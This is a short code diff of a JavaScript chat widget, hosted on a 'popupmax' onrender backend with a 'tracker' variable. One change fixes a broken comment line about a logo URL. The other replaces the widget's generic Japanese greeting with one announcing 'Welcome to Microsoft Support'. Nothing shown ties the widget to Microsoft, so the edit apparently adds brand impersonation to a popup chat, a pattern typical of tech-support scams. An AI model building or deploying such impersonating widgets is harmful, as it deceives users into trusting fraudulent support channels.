@@ -9,7 +9,7 @@
  */
 (function () {
   var BACKEND = ((window.__CHAT_BACKEND__ || window.__TRACKER_BACKEND__ || "https://popupmax-dmc5.onrender.com")).replace(/\/$/, "");
-  Set window.__CHAT_LOGO__ = "https://files-pop.s3.ap-northeast-1.amazonaws.com/msmm.png" before this script to show a logo in the header
+  // Set window.__CHAT_LOGO__ = "https://your-logo-url.png" before this script to show a logo in the header
   var LOGO = window.__CHAT_LOGO__ || "";
 
   // ── Inject styles ───────────────────────────────────────────────
@@ -97,7 +97,7 @@
         '<button id="cw-x" aria-label="閉じる">×</button>' +
       '</div>' +
       '<div id="cw-msgs">' +
-        '<div class="cw-m admin"><div>👋 こんにちは！お気軽にご質問ください。</div>' +
+        '<div class="cw-m admin"><div>👋 こんにちは。マイクロソフトサポートへようこそ。メッセージを入力してください。。</div>' +
         '<div class="cw-mt">サポート</div></div>' +
         '<div id="cw-typing"><div class="cw-dots"><span></span><span></span><span></span></div></div>' +
       '</div>' +
